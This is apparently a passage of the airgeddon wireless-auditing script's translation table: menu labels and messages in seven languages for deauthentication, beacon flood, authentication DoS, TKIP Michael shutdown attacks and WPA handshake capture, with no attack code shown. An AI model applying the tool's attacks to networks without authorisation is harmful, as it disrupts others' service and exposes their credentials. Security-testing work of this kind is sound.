	arr["CATALAN",60]="9.  Sobre & Crédits"
	arr["PORTUGUESE",60]="9.  Sobre & Créditos"
	arr["RUSSIAN",60]="9.  О программе и Благодарности"
	arr["GREEK",60]="9.  Σχετικά με & Εύσημα"

	arr["ENGLISH",61]="11. Exit script"
	arr["SPANISH",61]="11. Salir del script"
	arr["FRENCH",61]="11. Sortir du script"
	arr["CATALAN",61]="11. Sortir del script"
	arr["PORTUGUESE",61]="11. Sair do script"
	arr["RUSSIAN",61]="11. Выйти из скрипта"
	arr["GREEK",61]="11. Έξοδος script"

	arr["ENGLISH",62]="8.  Beacon flood attack"
	arr["SPANISH",62]="8.  Ataque Beacon flood"
	arr["FRENCH",62]="8.  Attaque Beacon flood"
	arr["CATALAN",62]="8.  Atac Beacon flood"
	arr["PORTUGUESE",62]="8.  Ataque Beacon flood"
	arr["RUSSIAN",62]="8.  Атака флудом маяков (beacon)"
	arr["GREEK",62]="8.  Επίθεση πλημμύρας φάρου (beacon)"

	arr["ENGLISH",63]="9.  Auth DoS attack"
	arr["SPANISH",63]="9.  Ataque Auth DoS"
	arr["FRENCH",63]="9.  Attaque Auth DoS"
	arr["CATALAN",63]="9.  Atac Auth Dos"
	arr["PORTUGUESE",63]="9.  Ataque Auth DoS"
	arr["RUSSIAN",63]="9.  DoS атака деаутентификации"
	arr["GREEK",63]="9.  Επίθεση Auth DoS"

	arr["ENGLISH",64]="10. Michael shutdown exploitation (TKIP) attack"
	arr["SPANISH",64]="10. Ataque Michael shutdown exploitation (TKIP)"
	arr["FRENCH",64]="10. Attaque Michael shutdown exploitation (TKIP)"
	arr["CATALAN",64]="10. Atac Michael shutdown exploitation (TKIP)"
	arr["PORTUGUESE",64]="10. Ataque Michael shutdown exploitation (TKIP)"
	arr["RUSSIAN",64]="10. Атака отключения эксплуатации от Michael (TKIP)"
	arr["GREEK",64]="10. Επίθεση Michael shutdown exploitation (TKIP)"

	arr["ENGLISH",65]="Exploring for targets option chosen (monitor mode needed)"
	arr["SPANISH",65]="Elegida opción de exploración para buscar objetivos (modo monitor requerido)"
	arr["FRENCH",65]="L'option de recherche des objectifs a été choisie (modo moniteur nécessaire)"
	arr["CATALAN",65]="Seleccionada opció d'exploració per buscar objectius (requerit mode monitor)"
	arr["PORTUGUESE",65]="Selecione uma opção de busca para encontar objetivos (modo monitor obrigatório)"
	arr["RUSSIAN",65]="Выбранные опции для сканирования целей (необходим режим монитора)"
	arr["GREEK",65]="Η επιλογή για εξερεύνηση στόχων έχει επιλεχθεί (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",66]="Selected interface ${interface} is in monitor mode. Exploration can be performed"
	arr["SPANISH",66]="La interfaz seleccionada ${interface} está en modo monitor. La exploración se puede realizar"
	arr["FRENCH",66]="L'interface choisie ${interface} est en mode moniteur. L'exploration des réseaux environnants peut s'effectuer"
	arr["CATALAN",66]="La interfície seleccionada ${interface} està en mode monitor. L'exploració es pot realitzar"
	arr["PORTUGUESE",66]="A interface selecionada ${interface} está no modo monitor. A verificação pode ser realizada"
	arr["RUSSIAN",66]="Выбранный интерфейс ${interface} в режиме монитора. Сканирование может быть выполнена"
	arr["GREEK",66]="Η επιλεγμένη διεπαφή ${interface} είναι σε κατάσταση παρακολούθησης. Μπορεί να γίνει εξερεύνηση"

	arr["ENGLISH",67]="When started, press [Ctrl+C] to stop..."
	arr["SPANISH",67]="Una vez empezado, pulse [Ctrl+C] para pararlo..."
	arr["FRENCH",67]="Une foi l'opération lancée, veuillez presser [Ctrl+C] pour l'arrêter..."
	arr["CATALAN",67]="Una vegada iniciat, polsi [Ctrl+C] per detenir-ho..."
	arr["PORTUGUESE",67]="Uma vez iniciado, pressione [Ctrl+C] para pará-lo..."
	arr["RUSSIAN",67]="После запуска, нажмите [Ctrl+C] для остановки..."
	arr["GREEK",67]="Όταν αρχίσει, πατήστε [Ctrl+C] για να σταματήσει..."

	arr["ENGLISH",68]="No networks found"
	arr["SPANISH",68]="No se encontraron redes"
	arr["FRENCH",68]="Aucun réseau détecté"
	arr["CATALAN",68]="No s'han trobat xarxes"
	arr["PORTUGUESE",68]="Nenhuma rede encontrada"
	arr["RUSSIAN",68]="Сети не найдены"
	arr["GREEK",68]="Δεν βρέθηκαν δίκτυα"

	arr["ENGLISH",69]="  N.         BSSID      CHANNEL  PWR   ENC    ESSID"
	arr["SPANISH",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["FRENCH",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["CATALAN",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["PORTUGUESE",69]="  N.         BSSID        CANAL  PWR   ENC    ESSID"
	arr["RUSSIAN",69]="  N.         BSSID      CHANNEL  PWR   ENC    ESSID"
	arr["GREEK",69]="  N.         BSSID      CHANNEL  PWR   ENC    ESSID"

	arr["ENGLISH",70]="Only one target detected. Autoselected"
	arr["SPANISH",70]="Sólo un objetivo detectado. Se ha seleccionado automáticamente"
	arr["FRENCH",70]="Un seul réseau a été détecté. Il a été automatiquement sélectionné"
	arr["CATALAN",70]="Només un objectiu detectat. Seleccionat automàticament"
	arr["PORTUGUESE",70]="Apenas uma rede encontrada. A rede foi selecionada automaticamente"
	arr["RUSSIAN",70]="Обнаружена только одна цель. Выбрана автоматически"
	arr["GREEK",70]="Εντοπίστηκε μόνο ένας στόχος. Επιλέχθηκε αυτόματα"

	arr["ENGLISH",71]="(*) Network with clients"
	arr["SPANISH",71]="(*) Red con clientes"
	arr["FRENCH",71]="(*) Réseau avec clients"
	arr["CATALAN",71]="(*) Xarxa amb clients"
	arr["PORTUGUESE",71]="(*) Rede com clientes"
	arr["RUSSIAN",71]="(*) Сеть с клиентами"
	arr["GREEK",71]="(*) Δίκτυο με χρήστες"

	arr["ENGLISH",72]="Invalid target network was chosen"
	arr["SPANISH",72]="Red objetivo elegida no válida"
	arr["FRENCH",72]="Le choix du réseau cible est invalide"
	arr["CATALAN",72]="Xarxa de destí seleccionada no vàlida"
	arr["PORTUGUESE",72]="A rede escolhida é inválida"
	arr["RUSSIAN",72]="Была выбрана неподходящая целевая сеть"
	arr["GREEK",72]="Επιλέχθηκε άκυρο δίκτυο"

	arr["ENGLISH",73]="airgeddon script v${airgeddon_version} developed by :"
	arr["SPANISH",73]="airgeddon script v${airgeddon_version} programado por :"
	arr["FRENCH",73]="Le script airgeddon v${airgeddon_version} a été programmé par :"
	arr["CATALAN",73]="airgeddon script v${airgeddon_version} desenvolupat per :"
	arr["PORTUGUESE",73]="Script airgeddon v${airgeddon_version} desenvolvido por :"
	arr["RUSSIAN",73]="скрипт airgeddon v${airgeddon_version} создал :"
	arr["GREEK",73]="airgeddon script v${airgeddon_version} προγραμματίστηκε από :"

	arr["ENGLISH",74]="This script is under GPLv3 (or later) License"
	arr["SPANISH",74]="Este script está bajo Licencia GPLv3 (o posterior)"
	arr["FRENCH",74]="Script publié sous Licence GPLv3 (ou version supèrieure)"
	arr["CATALAN",74]="Aquest script està publicat sota llicència GPLv3 (o versió superior)"
	arr["PORTUGUESE",74]="Este script está sob licença GPLv3 (ou posterior)"
	arr["RUSSIAN",74]="Этот скрипт под лицензией GPLv3 (или более поздней)"
	arr["GREEK",74]="Αυτό το script είναι υπό την άδεια GPLv3 (ή νεότερη)"

	arr["ENGLISH",75]="Thanks to the \"Spanish pentesting crew\", to the \"Wifislax Staff\", to the forums people who help me, my collaborators, translators and specially to Kcdtv for beta testing and support received"
	arr["SPANISH",75]="Gracias al \"Spanish pentesting crew\", al \"Wifislax Staff\", a la gente de los foros que me ayuda, a mis colaboradores, traductores y en especial a Kcdtv por el beta testing y el apoyo recibido"
	arr["FRENCH",75]="Merci au \"Spanish pentesting crew\" , au \"Wifislax Staff\", aux gens des forums qui m'ont aidés, à mes collaborateurs, aux traducteurs et tout spécialement à Kcdtv pour les tests en phase bêta et son soutien"
	arr["CATALAN",75]="Agraïments al \"Spanish pentesting crew\", al \"Wifislax Staff\", a la gent dels fòrums que m'ajuda, als meus col·laboradors, traductors i especialment al Kcdtv per les proves beta i el suport rebut"
	arr["PORTUGUESE",75]="Agradecimentos a \"Spanish pentesting crew\", \"Wifislax Staff\", as pessoas dos fóruns por me ajudar, os colaboradores, tradutores e especialmente para Kcdtv por testes beta e também a todo apoio recebido"
	arr["RUSSIAN",75]="Спасибо \"Spanish pentesting crew\", за \"Wifislax Staff\", людям с форумов, которые мне помогают, тем, кто принимает участие в проекте, переводчикам и особенно Kcdtv за бета тестирование и полученную поддержку"
	arr["GREEK",75]="Τις ευχαριστίες μου στην \"Ισπανική ομάδα pentesting\", στο \"Wifislax Staff\", στα άτομα από το forum που με βοηθάνε, στους συνεργάτες μου, στους μεταφραστές και ειδικά στον Kcdtv για το beta testing και την υποστήριξη που λάβαμε από αυτόν"

	arr["ENGLISH",76]="Invalid menu option was chosen"
	arr["SPANISH",76]="Opción del menú no válida"
	arr["FRENCH",76]="Option erronée"
	arr["CATALAN",76]="Opció del menú no vàlida"
	arr["PORTUGUESE",76]="Opção do menu inválida"
	arr["RUSSIAN",76]="Выбрана недействительная опция"
	arr["GREEK",76]="Επιλέχθηκε άκυρη επιλογή μενού"

	arr["ENGLISH",77]="Invalid interface was chosen"
	arr["SPANISH",77]="Interfaz no válida"
	arr["FRENCH",77]="L'interface choisie n'existe pas"
	arr["CATALAN",77]="Interfície no vàlida"
	arr["PORTUGUESE",77]="Interface inválida"
	arr["RUSSIAN",77]="Был выбран недействительный интерфейс"
	arr["GREEK",77]="Επιλέχθηκε άκυρη διεπαφή"

	arr["ENGLISH",78]="10. Change language"
	arr["SPANISH",78]="10. Cambiar idioma"
	arr["FRENCH",78]="10. Changer de langue"
	arr["CATALAN",78]="10. Canviar l'idioma"
	arr["PORTUGUESE",78]="10. Alterar idioma"
	arr["RUSSIAN",78]="10. Сменить язык"
	arr["GREEK",78]="10. Αλλαγή γλώσσας"

	arr["ENGLISH",79]="1.  English"
	arr["SPANISH",79]="1.  Inglés"
	arr["FRENCH",79]="1.  Anglais"
	arr["CATALAN",79]="1.  Anglés"
	arr["PORTUGUESE",79]="1.  Inglês"
	arr["RUSSIAN",79]="1.  Английский"
	arr["GREEK",79]="1.  Αγγλικά"

	arr["ENGLISH",80]="2.  Spanish"
	arr["SPANISH",80]="2.  Español"
	arr["FRENCH",80]="2.  Espagnol"
	arr["CATALAN",80]="2.  Espanyol"
	arr["PORTUGUESE",80]="2.  Espanhol"
	arr["RUSSIAN",80]="2.  Испанский"
	arr["GREEK",80]="2.  Ισπανικά"

	arr["ENGLISH",81]="Select a language :"
	arr["SPANISH",81]="Selecciona un idioma :"
	arr["FRENCH",81]="Choisissez une langue :"
	arr["CATALAN",81]="Selecciona un idioma :"
	arr["PORTUGUESE",81]="Selecione um idioma :"
	arr["RUSSIAN",81]="Выберите язык :"
	arr["GREEK",81]="Επιλέξτε μία γλώσσα :"

	arr["ENGLISH",82]="Invalid language was chosen"
	arr["SPANISH",82]="Idioma no válido"
	arr["FRENCH",82]="Langue non valide"
	arr["CATALAN",82]="Idioma no vàlid"
	arr["PORTUGUESE",82]="Idioma inválido"
	arr["RUSSIAN",82]="Был выбран неверный язык"
	arr["GREEK",82]="Επιλέχθηκε άκυρη γλώσσα"

	arr["ENGLISH",83]="Language changed to English"
	arr["SPANISH",83]="Idioma cambiado a Inglés"
	arr["FRENCH",83]="Le script sera maintenant en Anglais"
	arr["CATALAN",83]="Idioma canviat a Anglés"
	arr["PORTUGUESE",83]="Idioma alterado para Inglês"
	arr["RUSSIAN",83]="Язык изменён на английский"
	arr["GREEK",83]="Η γλώσσα άλλαξε σε Αγγλικά"

	arr["ENGLISH",84]="Language changed to Spanish"
	arr["SPANISH",84]="Idioma cambiado a Español"
	arr["FRENCH",84]="Le script sera maintenant en Espagnol"
	arr["CATALAN",84]="Idioma canviat a Espanyol"
	arr["PORTUGUESE",84]="Idioma alterado para Espanhol"
	arr["RUSSIAN",84]="Язык изменён на испанский"
	arr["GREEK",84]="Η γλώσσα άλλαξε σε Ισπανικά"

	arr["ENGLISH",85]="Send me bugs or suggestions to ${mail}"
	arr["SPANISH",85]="Enviadme errores o sugerencias a ${mail}"
	arr["FRENCH",85]="Envoyer des erreurs ou des suggestions à ${mail}"
	arr["CATALAN",85]="Envieu-me errorrs o suggeriments a ${mail}"
	arr["PORTUGUESE",85]="Enviar erros ou sugestões para ${mail}"
	arr["RUSSIAN",85]="Отправляйте ошибки и предложения мне на почту ${mail}"
	arr["GREEK",85]="Στείλτε μου αναφορές για bugs ή συστάσεις στο ${mail}"

	arr["ENGLISH",86]="Welcome"
	arr["SPANISH",86]="Bienvenid@"
	arr["FRENCH",86]="Bienvenue"
	arr["CATALAN",86]="Benvingut"
	arr["PORTUGUESE",86]="Bem-vindo"
	arr["RUSSIAN",86]="Добро пожаловать"
	arr["GREEK",86]="Καλως ορίσατε"

	arr["ENGLISH",87]="Change language"
	arr["SPANISH",87]="Cambiar idioma"
	arr["FRENCH",87]="Changer de langue"
	arr["CATALAN",87]="Canviar d'idioma"
	arr["PORTUGUESE",87]="Mudar idioma"
	arr["RUSSIAN",87]="Сменить язык"
	arr["GREEK",87]="Αλλάξτε γλώσσα"

	arr["ENGLISH",88]="Interface selection"
	arr["SPANISH",88]="Selección de interfaz"
	arr["FRENCH",88]="Sélection de l'interface"
	arr["CATALAN",88]="Selecció de interfície"
	arr["PORTUGUESE",88]="Seleção de interface"
	arr["RUSSIAN",88]="Выбор интерфейса"
	arr["GREEK",88]="Επιλογή διεπαφής"

	arr["ENGLISH",89]="Mdk3 amok action"
	arr["SPANISH",89]="Acción mdk3 amok"
	arr["FRENCH",89]="Action mdk3 amok"
	arr["CATALAN",89]="Acció mdk3 amok"
	arr["PORTUGUESE",89]="Acção mdk3 amok"
	arr["RUSSIAN",89]="Mdk3 amok в действии"
	arr["GREEK",89]="Ενέργεια mdk3 amok"

	arr["ENGLISH",90]="Aireplay deauth action"
	arr["SPANISH",90]="Acción aireplay deauth"
	arr["FRENCH",90]="Action aireplay deauth"
	arr["CATALAN",90]="Acció aireplay deauth"
	arr["PORTUGUESE",90]="Acção deauth aireplay"
	arr["RUSSIAN",90]="Деаутентификация Aireplay в действии"
	arr["GREEK",90]="Ενέργεια aireplay deauth"

	arr["ENGLISH",91]="WIDS / WIPS / WDS confusion action"
	arr["SPANISH",91]="Acción WIDS / WIPS / WDS confusion"
	arr["FRENCH",91]="Action WIDS / WIPS / WDS confusion"
	arr["CATALAN",91]="Acció WIDS / WIPS / WDS confusion"
	arr["PORTUGUESE",91]="Acção WIDS / WIPS / confusão WDS"
	arr["RUSSIAN",91]="Смешение WIDS / WIPS / WDS в действии"
	arr["GREEK",91]="Ενέργεια σύγχυσης WIDS / WIPS / WDS"

	arr["ENGLISH",92]="Beacon flood action"
	arr["SPANISH",92]="Acción Beacon flood"
	arr["FRENCH",92]="Action Beacon flood"
	arr["CATALAN",92]="Acció Beacon flood"
	arr["PORTUGUESE",92]="Acção Beacon flood"
	arr["RUSSIAN",92]="Флуд маяками в действии"
	arr["GREEK",92]="Ενέργεια πλημμυρίσματος φάρου"

	arr["ENGLISH",93]="Auth DoS action"
	arr["SPANISH",93]="Acción Auth DoS"
	arr["FRENCH",93]="Action Auth DoS"
	arr["CATALAN",93]="Acció Auth DoS"
	arr["PORTUGUESE",93]="Acção Auth DoS"
	arr["RUSSIAN",93]="DoS аутентификации в действии"
	arr["GREEK",93]="Ενέργεια Auth DoS"

	arr["ENGLISH",94]="Michael Shutdown action"
	arr["SPANISH",94]="Acción Michael Shutdown"
	arr["FRENCH",94]="Action Michael Shutdown"
	arr["CATALAN",94]="Acció Michael Shutdown"
	arr["PORTUGUESE",94]="Acção Michael Shutdown"
	arr["RUSSIAN",94]="Отключение Michael в действии"
	arr["GREEK",94]="Ενέργεια Michael Shutdown"

	arr["ENGLISH",95]="Mdk3 amok parameters"
	arr["SPANISH",95]="Parámetros Mdk3 amok"
	arr["FRENCH",95]="Paramètres Mdk3 amok"
	arr["CATALAN",95]="Paràmetres Mdk3 amok"
	arr["PORTUGUESE",95]="Parâmetros Mdk3 amok"
	arr["RUSSIAN",95]="Параметры Mdk3 amok"
	arr["GREEK",95]="Παράμετροι Mdk3 amok"

	arr["ENGLISH",96]="Aireplay deauth parameters"
	arr["SPANISH",96]="Parámetros Aireplay deauth"
	arr["FRENCH",96]="Paramètres Aireplay deauth"
	arr["CATALAN",96]="Paràmetres Aireplay deauth"
	arr["PORTUGUESE",96]="Parâmetros Aireplay deauth"
	arr["RUSSIAN",96]="Параметры деаутентификации Aireplay"
	arr["GREEK",96]="Παράμετροι Aireplay deauth"

	arr["ENGLISH",97]="WIDS / WIPS / WDS parameters"
	arr["SPANISH",97]="Parámetros WIDS / WIPS / WDS"
	arr["FRENCH",97]="Paramètres WIDS / WIPS / WDS"
	arr["CATALAN",97]="Paràmetres WIDS / WIPS / WDS"
	arr["PORTUGUESE",97]="Parâmetros WIDS / WIPS / WDS"
	arr["RUSSIAN",97]="Параметры WIDS / WIPS / WDS"
	arr["GREEK",97]="Παράμετροι WIDS / WIPS / WDS"

	arr["ENGLISH",98]="Beacon flood parameters"
	arr["SPANISH",98]="Parámetros Beacon flood"
	arr["FRENCH",98]="Paramètres Beacon flood"
	arr["CATALAN",98]="Paràmetres Beacon flood"
	arr["PORTUGUESE",98]="Parâmetros Beacon flood"
	arr["RUSSIAN",98]="Параметры флуда маяками"
	arr["GREEK",98]="Παράμετροι πλημμυρίσματος φάρου"

	arr["ENGLISH",99]="Auth DoS parameters"
	arr["SPANISH",99]="Parámetros Auth DoS"
	arr["FRENCH",99]="Paramètres Auth DoS"
	arr["CATALAN",99]="Paràmetres Auth DoS"
	arr["PORTUGUESE",99]="Parâmetros Auth DoS"
	arr["RUSSIAN",99]="Параметры аутентификации DoS"
	arr["GREEK",99]="Παράμετροι Auth DoS"

	arr["ENGLISH",100]="Michael Shutdown parameters"
	arr["SPANISH",100]="Parámetros Michael Shutdown"
	arr["FRENCH",100]="Paramètres Michael Shutdown"
	arr["CATALAN",100]="Paràmetres Michael Shutdown"
	arr["PORTUGUESE",100]="Parâmetros Michael Shutdown"
	arr["RUSSIAN",100]="Параметры отключения Michael"
	arr["GREEK",100]="Παράμετροι Michael Shutdown"

	arr["ENGLISH",101]="Airgeddon main menu"
	arr["SPANISH",101]="Menú principal airgeddon"
	arr["FRENCH",101]="Menu principal d'airgeddon"
	arr["CATALAN",101]="Menú principal airgeddon"
	arr["PORTUGUESE",101]="Menu principal airgeddon"
	arr["RUSSIAN",101]="Главное меню Airgeddon"
	arr["GREEK",101]="Αρχικό μενού Airgeddon"

	arr["ENGLISH",102]="DoS attacks menu"
	arr["SPANISH",102]="Menú ataques DoS"
	arr["FRENCH",102]="Menu des attaques DoS"
	arr["CATALAN",102]="Menú d'atacs DoS"
	arr["PORTUGUESE",102]="Menu de ataques DoS"
	arr["RUSSIAN",102]="Меню DoS атак"
	arr["GREEK",102]="Μενού επιθέσεων DoS"

	arr["ENGLISH",103]="Exploring for targets"
	arr["SPANISH",103]="Explorar para buscar objetivos"
	arr["FRENCH",103]="Détection pour trouver des cibles"
	arr["CATALAN",103]="Explorar per buscar objectius"
	arr["PORTUGUESE",103]="Navegue para localizar alvos"
	arr["RUSSIAN",103]="Сканирование целей"
	arr["GREEK",103]="Εξερεύνηση στόχων"

	arr["ENGLISH",104]="Select target"
	arr["SPANISH",104]="Seleccionar objetivo"
	arr["FRENCH",104]="Selection de l'objectif"
	arr["CATALAN",104]="Seleccionar objectiu"
	arr["PORTUGUESE",104]="Escolha um objetivo"
	arr["RUSSIAN",104]="Выбор цели"
	arr["GREEK",104]="Επιλέξτε στόχο"

	arr["ENGLISH",105]="About & Credits"
	arr["SPANISH",105]="Acerca de & Créditos"
	arr["FRENCH",105]="A propos de & Crédits"
	arr["CATALAN",105]="Sobre de & Crédits"
	arr["PORTUGUESE",105]="Sobre & Créditos"
	arr["RUSSIAN",105]="О программе и Благодарности"
	arr["GREEK",105]="Σχετικά με & Εύσυμα"

	arr["ENGLISH",106]="Exiting"
	arr["SPANISH",106]="Saliendo"
	arr["FRENCH",106]="Sortie du script"
	arr["CATALAN",106]="Sortint"
	arr["PORTUGUESE",106]="Saindo"
	arr["RUSSIAN",106]="Выход"
	arr["GREEK",106]="Γίνεται έξοδος"

	arr["ENGLISH",107]="Join the project at ${urlgithub}"
	arr["SPANISH",107]="Únete al proyecto en ${urlgithub}"
	arr["FRENCH",107]="Rejoignez le projet : ${urlgithub}"
	arr["CATALAN",107]="Uneix-te al projecte a ${urlgithub}"
	arr["PORTUGUESE",107]="Junte-se ao projeto em ${urlgithub}"
	arr["RUSSIAN",107]="Присоединитесь к проекту на ${urlgithub}"
	arr["GREEK",107]="Συμμετέχετε στο project ${urlgithub}"

	arr["ENGLISH",108]="Let's check if you have installed what script needs"
	arr["SPANISH",108]="Vamos a chequear si tienes instalado lo que el script requiere"
	arr["FRENCH",108]="Nous allons vérifier si les dépendances sont bien installées"
	arr["CATALAN",108]="Anem a verificar si tens instal·lat el que l'script requereix"
	arr["PORTUGUESE",108]="Vamos verificar se você tem instalado tudo que o script exige"
	arr["RUSSIAN",108]="Давайте проверим, всё ли у вас установлено, что нужно скрипту"
	arr["GREEK",108]="Ας ελέγξουμε αν έχετε εγκαταστήσει ό,τι χρειάζεται το script"

	arr["ENGLISH",109]="Essential tools: checking..."
	arr["SPANISH",109]="Herramientas esenciales: comprobando..."
	arr["FRENCH",109]="Vérification de la présence des outils nécessaires..."
	arr["CATALAN",109]="Eines essencials: comprovant..."
	arr["PORTUGUESE",109]="Verificando se as ferramentas necessárias estão presentes..."
	arr["RUSSIAN",109]="Основные инструменты: проверка..."
	arr["GREEK",109]="Απαραίτητα εργαλεία: γίνεται έλεγχος..."

	arr["ENGLISH",110]="Your distro has all necessary essential tools. Script can continue..."
	arr["SPANISH",110]="Tu distro tiene todas las herramientas esenciales necesarias. El script puede continuar..."
	arr["FRENCH",110]="Les outils essentiels nécessaires au bon fonctionnement du programme sont tous présents dans votre système. Le script peut continuer..."
	arr["CATALAN",110]="La teva distro té totes les eines essencials necessàries. El script pot continuar..."
	arr["PORTUGUESE",110]="Sua distro tem as ferramentas essenciais. O script pode continuar..."
	arr["RUSSIAN",110]="Ваша система имеет все необходимые основные инструменты. Скрипт может продолжать..."
	arr["GREEK",110]="Η διανομή σας έχει όλα τα απαραίτητα εργαλεία. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",111]="You need to install some essential tools before running this script"
	arr["SPANISH",111]="Necesitas instalar algunas herramientas esenciales antes de lanzar este script"
	arr["FRENCH",111]="Vous devez installer quelques programmes avant de pouvoir lancer ce script"
	arr["CATALAN",111]="Necessites instal·lar algunes eines essencials abans d'executar aquest script"
	arr["PORTUGUESE",111]="Você precisa instalar algumas ferramentas essenciais antes de executar este script"
	arr["RUSSIAN",111]="Перед работой в этом скрипте, вам нужно установить некоторые основные инструменты"
	arr["GREEK",111]="Χρειάζεται να εγκαταστήσετε κάποια απαραίτητα εργαλεία πριν τρέξετε το script"

	arr["ENGLISH",112]="Language changed to French"
	arr["SPANISH",112]="Idioma cambiado a Francés"
	arr["FRENCH",112]="Le script sera maintenant en Français"
	arr["CATALAN",112]="Llenguatge canviat a Francès"
	arr["PORTUGUESE",112]="Idioma alterado para Francês"
	arr["RUSSIAN",112]="Язык изменён на французский"
	arr["GREEK",112]="Η γλώσσα άλλαξε σε Γαλλικά"

	arr["ENGLISH",113]="3.  French"
	arr["SPANISH",113]="3.  Francés"
	arr["FRENCH",113]="3.  Français"
	arr["CATALAN",113]="3.  Francès"
	arr["PORTUGUESE",113]="3.  Francês"
	arr["RUSSIAN",113]="3.  Французский"
	arr["GREEK",113]="3.  Γαλλικά"

	arr["ENGLISH",114]="Use it only on your own networks!!"
	arr["SPANISH",114]="Utilízalo solo en tus propias redes!!"
	arr["FRENCH",114]="Utilisez-le seulement dans vos propres réseaux!!"
	arr["CATALAN",114]="Utilitza'l només a les teves pròpies xarxes!!"
	arr["PORTUGUESE",114]="Use-o apenas em suas próprias redes!!"
	arr["RUSSIAN",114]="Используйте только на ваших собственных сетях!!!"
	arr["GREEK",114]="Χρησιμοποιήστε το μόνο σε δικά σας δίκτυα!!!"

	arr["ENGLISH",115]="Press [Enter] key to continue..."
	arr["SPANISH",115]="Pulsa la tecla [Enter] para continuar..."
	arr["FRENCH",115]="Pressez [Enter] pour continuer..."
	arr["CATALAN",115]="Prem la tecla [Enter] per continuar..."
	arr["PORTUGUESE",115]="Pressione a tecla [Enter] para continuar..."
	arr["RUSSIAN",115]="Нажмите клавишу [Enter] для продолжения..."
	arr["GREEK",115]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."

	arr["ENGLISH",116]="4.  Catalan"
	arr["SPANISH",116]="4.  Catalán"
	arr["FRENCH",116]="4.  Catalan"
	arr["CATALAN",116]="4.  Català"
	arr["PORTUGUESE",116]="4.  Catalão"
	arr["RUSSIAN",116]="4.  Каталонский"
	arr["GREEK",116]="4.  Καταλανικά"

	arr["ENGLISH",117]="Language changed to Catalan"
	arr["SPANISH",117]="Idioma cambiado a Catalán"
	arr["FRENCH",117]="Le script sera maintenant en Catalan"
	arr["CATALAN",117]="Idioma canviat a Català"
	arr["PORTUGUESE",117]="Idioma alterado para Catalão"
	arr["RUSSIAN",117]="Язык изменён на каталонский"
	arr["GREEK",117]="Η γλώσσα άλλαξε σε Καταλανικά"

	arr["ENGLISH",118]="4.  DoS attacks menu"
	arr["SPANISH",118]="4.  Menú de ataques DoS"
	arr["FRENCH",118]="4.  Menu des attaques DoS"
	arr["CATALAN",118]="4.  Menú d'atacs DoS"
	arr["PORTUGUESE",118]="4.  Menu de ataques DoS"
	arr["RUSSIAN",118]="4.  Меню DoS атак"
	arr["GREEK",118]="4.  Μενού επιθέσεων DoS"

	arr["ENGLISH",119]="5.  Handshake tools menu"
	arr["SPANISH",119]="5.  Menú de herramientas Handshake"
	arr["FRENCH",119]="5.  Menu des outils pour Handshake"
	arr["CATALAN",119]="5.  Menú d'eines Handshake"
	arr["PORTUGUESE",119]="5.  Menu ferramentas Handshake"
	arr["RUSSIAN",119]="5.  Меню инструментов для работы с рукопожатием"
	arr["GREEK",119]="5.  Μενού εργαλειών Χειραψίας"

	arr["ENGLISH",120]="Handshake tools menu"
	arr["SPANISH",120]="Menú de herramientas Handshake"
	arr["FRENCH",120]="Menu des outils pour Handshake"
	arr["CATALAN",120]="Menú d'eines Handshake"
	arr["PORTUGUESE",120]="Menu de ferramentas Handshake"
	arr["RUSSIAN",120]="Меню инструментов для работы с рукопожатием"
	arr["GREEK",120]="Μενού εργαλειών Χειραψίας"

	arr["ENGLISH",121]="5.  Capture Handshake"
	arr["SPANISH",121]="5.  Capturar Handshake"
	arr["FRENCH",121]="5.  Capture du Handshake"
	arr["CATALAN",121]="5.  Captura Handshake"
	arr["PORTUGUESE",121]="5.  Captura de Handshake"
	arr["RUSSIAN",121]="5.  Захват рукопожатия"
	arr["GREEK",121]="5.  Καταγράψτε την Χειραψία"

	arr["ENGLISH",122]="6.  Clean/optimize Handshake file"
	arr["SPANISH",122]="6.  Limpiar/optimizar fichero de Handshake"
	arr["FRENCH",122]="6.  Laver/optimiser le fichier Handshake"
	arr["CATALAN",122]="6.  Netejar/optimitzar fitxer de Handshake"
	arr["PORTUGUESE",122]="6.  Limpar arquivo/otimizar Handshake"
	arr["RUSSIAN",122]="6.  Очистка/оптимизация файла рукопожатия"
	arr["GREEK",122]="6.  Καθαρισμός/βελτιστοποίηση του αρχείου Χειραψίας"

	arr["ENGLISH",123]="7.  Return to main menu"
	arr["SPANISH",123]="7.  Volver al menú principal"
	arr["FRENCH",123]="7.  Retourner au menu principal"
	arr["CATALAN",123]="7.  Tornar al menú principal"
	arr["PORTUGUESE",123]="7.  Voltar ao menu principal"
	arr["RUSSIAN",123]="7.  Возврат в главное меню"
	arr["GREEK",123]="7.  Επιστροφή στο αρχικό μενού"

	arr["ENGLISH",124]="monitor mode needed for capturing"
	arr["SPANISH",124]="modo monitor requerido en captura"
	arr["FRENCH",124]="modo moniteur nécessaire pour la capture"
	arr["CATALAN",124]="mode monitor requerit en captura"
	arr["PORTUGUESE",124]="Modo de monitor necessário para captura"
	arr["RUSSIAN",124]="для захвата необходим режим монитора"
	arr["GREEK",124]="χρειάζεται η κατάσταση παρακολούθησης για την καταγραφή"

	arr["ENGLISH",125]="There is no valid target network selected. You'll be redirected to select one"
	arr["SPANISH",125]="No hay una red objetivo válida seleccionada. Serás redirigido para seleccionar una"
	arr["FRENCH",125]="Le choix du réseau cible est incorrect. Vous allez être redirigé vers le menu de sélection pour effectuer un nouveau choix"
	arr["CATALAN",125]="No hi ha una xarxa objectiu vàlida seleccionada. Seràs redirigit per seleccionar una"
	arr["PORTUGUESE",125]="Nenhuma rede válida selecionada. Você será redirecionado para selecionar um"
	arr["RUSSIAN",125]="Не выбрана подходящая целевая сеть. Вы будете перенаправлены на выбор сети"
	arr["GREEK",125]="Δεν έχει επιλεχθεί κάποιο έγκυρο δίκτυο-στόχος. Θα καθοδηγηθείτε ώστε να επιλέξετε ένα"

	arr["ENGLISH",126]="You have a valid WPA/WPA2 target network selected. Script can continue..."
	arr["SPANISH",126]="Tienes una red objetivo WPA/WPA2 válida seleccionada. El script puede continuar..."
	arr["FRENCH",126]="Choix du réseau cible WPA/WPA2 valide. Le script peut continuer..."
	arr["CATALAN",126]="Tens una xarxa objectiu WPA/WPA2 vàlida seleccionada. El script pot continuar..."
	arr["PORTUGUESE",126]="Você tem uma rede WPA/WPA2 válida selecionada. O script pode continuar..."
